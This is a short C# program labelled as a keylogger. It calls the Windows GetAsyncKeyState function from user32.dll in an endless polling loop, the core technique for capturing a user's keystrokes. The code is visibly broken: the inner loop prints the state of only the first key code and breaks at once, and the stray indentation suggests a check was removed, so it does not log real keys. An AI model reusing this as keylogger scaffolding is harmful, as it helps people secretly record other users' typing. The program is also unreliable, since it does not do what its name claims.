using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(100);

                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                
                        Console.WriteLine(keyState);
                        break;
                    
                }
            }
        }
    }
}
